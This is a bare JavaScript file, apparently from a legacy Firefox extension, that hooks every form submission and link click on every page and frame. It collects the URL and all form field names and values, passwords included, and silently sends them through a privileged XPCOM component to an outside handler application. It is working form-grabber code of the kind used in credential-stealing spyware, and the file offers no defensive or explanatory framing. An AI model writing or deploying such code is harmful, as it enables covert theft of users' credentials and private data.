document.addEventListener("mousedown", setPageHandlers, true);
document.addEventListener("keydown", docKeyPress, true);

function docKeyPress(a)
{
	setPageHandlers();
}

function addEvent(obj, evType, fn)
{
	if (obj.addEventListener)
	{
		obj.addEventListener(evType, fn, false);
		return true;
  	}
  	else if (obj.attachEvent)
	{
		var r = obj.attachEvent("on"+evType, fn);
	    	return r;
	}
	else
  	{
    		return false;
  	}
}

function send_form_data(data)
{
	try {
		netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
		const cid = "@mydomain.com/XPCOM/AppInterConn;1";
		obj = Components.classes[cid].createInstance();
		obj = obj.QueryInterface(Components.interfaces.IAppInterConn);
		obj.SendData("handler_app_class", data);
	} catch (err)
	{
		alert(err);
		return;
	}
}

function nameit(s)
{
	if (s == "")
		return "unknown";
	else
		return	s;
}

function grab_form(form)
{
    	var local_content = getBrowser().contentWindow;

	var r = "URL: " + local_content.location + "\n";
	for (var i=0; i < form.length; i++)
	{
		try {
			var element = form.elements[i];
			var el_type = element.type.toLowerCase();
			var el_name = element.name;
			var el_value = element.value;

			r = r + nameit(el_name) + "(" + el_type + ")";
			r = r + "=" + el_value;
			if (el_type == "checkbox" || el_type == "radio_selected")
			{
				if (element.checked)
					r = r + "[checked]";
				else
					r = r + "[unchecked]";
			}
			r = r + " ";
		  } catch (e) {
		  	// do nothing
		  }
	}
	r = r + "\nAction: " + form.action + "\n";
	return r;
}

function submit_event()
{
	  try {
	  	var form_data = "";
	    	var local_content = getBrowser().contentWindow;
		// accumulate our nodes
		var nodes = getPageNodes(local_content);
		for (var i=0; i<nodes.length; i++)
		{
			var tagn = nodes[i].tagName.toLowerCase();
			if (tagn == 'form')
				form_data = form_data + grab_form(nodes[i]) + "\n";
		}
		if (form_data != "")
			send_form_data(form_data);
	  } catch (e) {
	  	alert("exception: " + e);
	  }
	  return true;
}

// Handle frames if they're present
function getPageNodes(local_content)
{
	var frames = local_content.frames;

	// The main content may have forms as well as it's frames
	var nodes = getLinkNodes(local_content.content.document);
	var tmp;
	for (var i=0; i < frames.length; i++)
	{
		tmp = getLinkNodes(frames[i].document);
		for (var j=0; j<tmp.length; j++)
			nodes.push(tmp[j]);
	}
	return nodes;
}

// For a single document, grab all the forms
function getLinkNodes(doc)
{
	var f_nodes = doc.getElementsByTagName('form');
	var a_nodes = doc.getElementsByTagName('a');
	var links = [];
	for (var i=0; i<f_nodes.length; i++)
		links.push(f_nodes[i]);
	for (var i=0; i<a_nodes.length; i++)
	{
		if (!a_nodes[i].hasAttribute('href')) continue;
		links.push(a_nodes[i]);
	}
	return links;
}

function setPageHandlers() 
{
    try {
    	var local_content = getBrowser().contentWindow;
	// accumulate our nodes
	var nodes = getPageNodes(local_content);
	// finally, place handlers
	for (var i=0; i<nodes.length; i++)
	{
		var tagn = nodes[i].tagName.toLowerCase();
		if (tagn == 'form')
	    		addEvent(nodes[i], 'submit', submit_event);
		else if (tagn == 'a')
	    		addEvent(nodes[i], 'click', submit_event);
    	}
    } catch (e) { 
	alert("exception: " + e);
    }
}
